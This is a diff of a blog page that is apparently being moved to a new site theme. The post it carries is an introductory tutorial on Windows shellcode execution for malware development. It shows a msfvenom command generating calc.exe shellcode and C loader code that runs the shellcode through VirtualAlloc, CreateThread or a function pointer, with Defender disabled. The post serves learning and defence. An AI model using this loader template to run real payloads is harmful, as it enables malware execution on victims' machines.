@@ -17,44 +17,14 @@
 
 
 
-  
-  <link rel="stylesheet" href="https://IamAlch3mist.github.io/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
 
-  
-  <link rel="stylesheet" href="https://IamAlch3mist.github.io/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
 
   
-  <link rel="stylesheet" href="https://IamAlch3mist.github.io/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
-
   
-  <link rel="stylesheet" href="https://IamAlch3mist.github.io/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
-
   
-  <link rel="stylesheet" href="https://IamAlch3mist.github.io/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
-
   
-  <link rel="stylesheet" href="https://IamAlch3mist.github.io/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
-
   
-  <link rel="stylesheet" href="https://IamAlch3mist.github.io/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
-
-  
-  <link rel="stylesheet" href="https://IamAlch3mist.github.io/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
-
-  
-  <link rel="stylesheet" href="https://IamAlch3mist.github.io/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
-
-  
-  <link rel="stylesheet" href="https://IamAlch3mist.github.io/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
-
-  
-  <link rel="stylesheet" href="https://IamAlch3mist.github.io/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
-
-  
-  <link rel="stylesheet" href="https://IamAlch3mist.github.io/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
-
-  
-  <link rel="stylesheet" href="https://IamAlch3mist.github.io/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+  <link rel="stylesheet" href="https://IamAlch3mist.github.io/styles.css">
 
 
 
@@ -62,8 +32,9 @@
 
 
 
-<link rel="shortcut icon" href="https://IamAlch3mist.github.io/favicon.png">
-<link rel="apple-touch-icon" href="https://IamAlch3mist.github.io/apple-touch-icon.png">
+  <link rel="shortcut icon" href="https://IamAlch3mist.github.io/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="https://IamAlch3mist.github.io/img/theme-colors/green.png">
+
 
 
 <meta name="twitter:card" content="summary" />
@@ -98,18 +69,24 @@
 
 
 
+
+  
+
+
 </head>
-<body>
+<body class="green">
 
 
-<div class="container center">
+
+
+<div class="container center headings--one-size">
 
   <header class="header">
   <div class="header__inner">
     <div class="header__logo">
       <a href="https://IamAlch3mist.github.io/">
   <div class="logo">
-    Terminal
+    re-Terminal
   </div>
 </a>
 
@@ -137,6 +114,7 @@
   <ul class="navigation-menu__inner menu--desktop">
     
       
+      
         
           <li><a href="/about/" >`whoami`</a></li>
         
@@ -156,7 +134,9 @@
   <h1 class="post-title">
     <a href="https://IamAlch3mist.github.io/posts/into_to_shellcode_exec/">Introduction to shellcode execution</a>
   </h1>
-  <div class="post-meta"><time class="post-date">2024-05-12</time><span class="post-reading-time">4 min read (809 words)</span></div>
+  <div class="post-meta"><time class="post-date">2024-05-12</time>
+    
+<span class="post-reading-time">4 min read (809 words)</span></div>
 
   
     <span class="post-tags">
@@ -170,26 +150,27 @@
   
 
 
+
   
 
   <div class="post-content"><div>
-        <h1 id="introduction">Introduction<a href="#introduction" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+        <h1 id="introduction">Introduction<a href="#introduction" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>Hey, everyone in this short blog post I’m going to discuss about shellcode execution in windows environment. I know there are a lot of blogs about this topic available online, lately I started learning windows internals and malware development &amp; exploitation on windows platform so I’m writing this blogs to document my process for my own future references. In this blog I’m not going to show any crazy EDR/Anti-virus or AMSI bypass techniques, rather I’m covering the foundational knowledge required to get started in malware development.</p>
 <pre tabindex="0"><code>Disclaimer: 
 Malware development is illegal. 
 This blog post is for educational purposes only to understand how malware works. 
 I am not responsible for any illegal activity resulting from the information provided.
 </code></pre><p>In upcoming modules I’ll cover more advanced malware development concepts to bypass AV/EDR solutions. I’m planning to write it as a series of blog posts, so lets get started. If you are a red teamer, exploit developer, malware analyst or simply you want to understand how malware works, this blog post is for you.</p>
-<h1 id="what-is-a-shellcode">What is a shellcode?<a href="#what-is-a-shellcode" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<h1 id="what-is-a-shellcode">What is a shellcode?<a href="#what-is-a-shellcode" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>Shellcode is a small piece of assembly code used to exploit a software vulnerability, malware also uses this shellcode to do malicious actions which can be connecting back to a C2, providing reverse shell to attacker or exploiting additional software vulnerabilities for higher privileges. In this blog post we’ll execute a simple calc shellcode which spawns calc.exe program.</p>
 <p>I’m using metasploit to create shellcode. Using the below command we will generate the shellcode in a format that we can use it in our malware.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/x64/exec CMD<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;calc.exe&#39;</span> -f c
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/x64/exec CMD<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;calc.exe&#39;</span> -f c
 </span></span></code></pre></div><p><img src="/img/intro_to_shellcode_exec/1.png" alt="shellcode generate"></p>
 <p>I’ll be using C to write the malware, you can use the language which is suitable for you (go, .net, nim, etc).</p>
-<h1 id="method-1-shellcode-execution-as-a-thread">Method 1: Shellcode Execution as a Thread<a href="#method-1-shellcode-execution-as-a-thread" class="hanchor" ariaLabel="Anchor">#</a> </h1>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
+<h1 id="method-1-shellcode-execution-as-a-thread">Method 1: Shellcode Execution as a Thread<a href="#method-1-shellcode-execution-as-a-thread" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>	LPVOID ptr_address;
@@ -229,8 +210,8 @@ I am not responsible for any illegal activity resulting from the information pro
 <p><strong>CreateThread</strong> function starts a thread in calling process virtual memory. 3rd parameter to the function is the pointer to be executed. In our case the newly allocated buffer which holds our shellcode.</p>
 <p>Compile the above code using visual studio. Build the project and start executing it, it will spawn the calc.exe process. We can use this base template to test our shellcodes in upcoming blogs.</p>
 <p><img src="/img/intro_to_shellcode_exec/2.png" alt="shellcode execution"></p>
-<h1 id="method-2-as-function-pointer">Method 2: as function pointer<a href="#method-2-as-function-pointer" class="hanchor" ariaLabel="Anchor">#</a> </h1>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>	ptr_address <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>(NULL, <span style="color:#66d9ef">sizeof</span>(shellcode), MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+<h1 id="method-2-as-function-pointer">Method 2: as function pointer<a href="#method-2-as-function-pointer" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>	ptr_address <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>(NULL, <span style="color:#66d9ef">sizeof</span>(shellcode), MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 </span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">memcpy</span>(ptr_address, shellcode, <span style="color:#66d9ef">sizeof</span>(shellcode));
 </span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>fn_ptr)();
 </span></span><span style="display:flex;"><span>	fn_ptr <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>)()) (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)ptr_address;
@@ -243,7 +224,7 @@ I am not responsible for any illegal activity resulting from the information pro
 <p>In assembly it looks a lot simpler than C source code.</p>
 <pre tabindex="0"><code>Note for this example I&#39;ve disabled windows defender 
 otherwise defender will detect it as malicious executable and removes it
-</code></pre><h1 id="references">references<a href="#references" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+</code></pre><h1 id="references">references<a href="#references" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc</a></p>
 <p><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread">https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread</a></p>
 <p><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect">https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect</a></p>
@@ -253,27 +234,29 @@ otherwise defender will detect it as malicious executable and removes it
   
     
 <div class="pagination">
-  <div class="pagination__title">
-    <span class="pagination__title-h"></span>
-    <hr />
-  </div>
-  <div class="pagination__buttons">
-    
-      <a href="https://IamAlch3mist.github.io/posts/nrf51_code_readout_bypass/" class="button inline prev">
-        &lt; [<span class="button__text">nRF51 readback protection (RBPCONF) bypass</span>]
-      </a>
-    
-    
-      ::
-    
-    
-      <a href="https://IamAlch3mist.github.io/posts/binary_emulation_pt1/" class="button inline next">
-         [<span class="button__text">IoT binary analysis &amp; emulation part -1</span>] &gt;
-      </a>
-    
-  </div>
+    <div class="pagination__title">
+        <span class="pagination__title-h"></span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://IamAlch3mist.github.io/posts/nrf51_code_readout_bypass/">
+                <span class="button__icon">←</span>
+                <span class="button__text">nRF51 readback protection (RBPCONF) bypass</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="https://IamAlch3mist.github.io/posts/binary_emulation_pt1/">
+                <span class="button__text">IoT binary analysis &amp; emulation part -1</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
 </div>
-
 
   
 
@@ -292,7 +275,7 @@ otherwise defender will detect it as malicious executable and removes it
       <div class="copyright">
         <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
     
-      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      <span>:: <a href="https://github.com/mirus-ua/hugo-theme-re-terminal" target="_blank">Theme</a> made by <a href="https://github.com/mirus-ua" target="_blank">Mirus</a></span>
       </div>
   </div>
 </footer>
@@ -303,6 +286,9 @@ otherwise defender will detect it as malicious executable and removes it
 
 
 <script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
 
 
 
